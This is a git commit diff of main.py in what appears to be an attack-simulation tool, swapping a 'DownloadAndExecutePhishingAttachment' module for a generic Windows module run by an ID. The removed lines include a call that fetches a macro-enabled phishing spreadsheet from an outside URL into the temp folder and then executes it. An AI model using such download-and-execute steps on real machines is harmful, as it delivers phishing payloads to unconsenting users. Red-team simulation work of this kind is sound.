a46fd5bd20c687abc00767321f99c1f0bd1c13f8
opabravo <21262207+opabravo@users.noreply.github.com>
2023-03-10 18:22:05 +0800

    Finish windows execution module (roughly)

--- main.py
+++ main.py
@@ -1,14 +1,8 @@
-from core.module.windows.D import DownloadAndExecutePhishingAttachment
+from core.module.windows import WindowsModule
 
 
 if __name__ == '__main__':
-    # module = DownloadAndExecutePhishingAttachment()
-    # print(file_exist("$env:temp\wsu8257.tmp"))
-    # print(download("https://cym-rt-resources.s3-eu-west-1.amazonaws.com/PhishingAttachment.xlsm", "$env:temp\PhishingAttachment.xlsm")[1].decode('big5'))
-    m = DownloadAndExecutePhishingAttachment()
-    # print(repr(m.execution))
-    # print(m.execution.dependencies)
+    m = WindowsModule("62385f03a0e69ed2274622cc", debug=False)
 
     # Template Main
-    # print(m.check_dependency())
-    print(m.execute())
+    m.run()
